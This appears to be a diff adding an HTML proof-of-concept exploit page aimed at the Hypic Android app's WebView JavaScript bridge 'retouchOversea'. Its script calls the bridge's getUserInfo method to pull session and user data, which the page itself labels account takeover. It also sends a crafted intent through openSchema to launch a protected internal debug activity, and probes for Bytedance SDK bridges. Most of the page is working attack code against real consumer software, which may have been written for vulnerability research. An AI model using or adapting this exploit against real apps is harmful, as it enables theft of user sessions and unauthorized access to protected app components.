@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hypic WebView JS Interface PoC</title>
+    <style>
+        body { font-family: sans-serif; margin: 20px; background-color: #f4f4f4; color: #333; }
+        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h1, h2 { color: #ff3b30; /* Hypic Red */ }
+        button {
+            background-color: #000000; /* Dark Theme */
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            display: block;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button:hover { background-color: #333333; }
+        textarea { width: 100%; box-sizing: border-box; margin-bottom:10px; padding: 8px; border-radius: 4px; border: 1px solid #ccc;}
+        .info { background-color: #e7f3fe; border-left: 6px solid #ff3b30; padding: 10px; margin-bottom: 15px;}
+        
+        /* Custom Alert override for Hypic's broken WebChromeClient */
+        #custom-alert {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); z-index: 9999; justify-content: center; align-items: center;
+        }
+        .alert-content {
+            background: white; padding: 20px; border-radius: 8px; width: 80%; 
+            max-width: 400px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); word-wrap: break-word;
+        }
+        .alert-content pre { background: #eee; padding: 10px; overflow-x: auto; max-height: 300px; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Hypic WebView JavaScript Interface PoC</h1>
+        <p>This page attempts to interact with exposed JavaScript interfaces in the Hypic Android app.</p>
+
+        <div class="info">
+            The target is the custom <b>retouchOversea</b> bridge which bypasses the standard Bytedance AuthConfig.
+        </div>
+
+        <h2>1. Test <code style="color:var(--accent-green); background:rgba(255,255,255,0.1); padding:2px 5px; border-radius:4px; font-family:'Consolas', 'Monaco', monospace">getUserInfo</code> (Account Takeover)</h2>
+        <p>This attempts to exfiltrate the session and user data via the custom bridge.</p>
+        <button onclick="testUserInfo()">Steal User Info</button>
+
+        <h2>2. Test <code style="color:var(--accent-green); background:rgba(255,255,255,0.1); padding:2px 5px; border-radius:4px; font-family:'Consolas', 'Monaco', monospace">openSchema</code> (Intent Redirection)</h2>
+        <p>This attempts to launch a protected, non-exported internal Activity.</p>
+        <button onclick="testIntentRedirection()">Launch Internal Activity</button>
+
+        <h2>3. SDK Diagnostic Check</h2>
+        <p>Checks if the standard Bytedance SDK bridge is present.</p>
+        <button onclick="testSDKBridge()">Check JS2NativeBridge</button>
+    </div>
+
+    <!-- Custom Alert Modal (Polyfill) -->
+    <div id="custom-alert">
+        <div class="alert-content">
+            <h3>JSB Output</h3>
+            <pre id="alert-msg"></pre>
+            <button onclick="document.getElementById('custom-alert').style.display='none'">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // Override native alert since Hypic's WebView swallows it
+        window.alert = function(msg) {
+            document.getElementById('alert-msg').innerText = msg;
+            document.getElementById('custom-alert').style.display = 'flex';
+        };
+
+        // Global Callback for Hypic Bridge
+        window.handleUserInfoResponse = function(responseObj) {
+            alert("SUCCESS! Extracted App Data:\n\n" + JSON.stringify(responseObj, null, 2));
+        };
+
+        function testUserInfo() {
+            if (window.retouchOversea && typeof window.retouchOversea.postMessage === 'function') {
+                try {
+                    const payload = {
+                        func: "getUserInfo",
+                        data: {}, 
+                        cb: "handleUserInfoResponse"
+                    };
+                    window.retouchOversea.postMessage(JSON.stringify(payload));
+                } catch (e) {
+                    alert('Error calling retouchOversea: ' + e.toString());
+                }
+            } else {
+                alert('retouchOversea interface not found on window.');
+            }
+        }
+
+        function testIntentRedirection() {
+            if (window.retouchOversea && typeof window.retouchOversea.postMessage === 'function') {
+                try {
+                    const targetIntent = "intent:#Intent;component=com.xt.retouchoversea/com.xt.retouch.debug.DevModelActivity;end";
+                    const payload = {
+                        func: "openSchema",
+                        data: {
+                            "schema": targetIntent,
+                            "open_other_app": "1"
+                        },
+                        cb: "console.log"
+                    };
+                    window.retouchOversea.postMessage(JSON.stringify(payload));
+                    alert('Attempted to trigger internal intent routing.');
+                } catch (e) {
+                    alert('Error calling openSchema: ' + e.toString());
+                }
+            } else {
+                alert('retouchOversea interface not found on window.');
+            }
+        }
+
+        function testSDKBridge() {
+            if (typeof JS2NativeBridge !== 'undefined' && JS2NativeBridge._invokeMethod) {
+                alert('SUCCESS: JS2NativeBridge._invokeMethod IS accessible!');
+            } else if (window.ToutiaoJSBridge && window.ToutiaoJSBridge.invokeMethod) {
+                alert('SUCCESS: ToutiaoJSBridge.invokeMethod IS accessible!');
+            } else {
+                alert('INFO: Bytedance SDK bridges are NOT accessible from this page.');
+            }
+        }
+    </script>
+</body>
+</html>
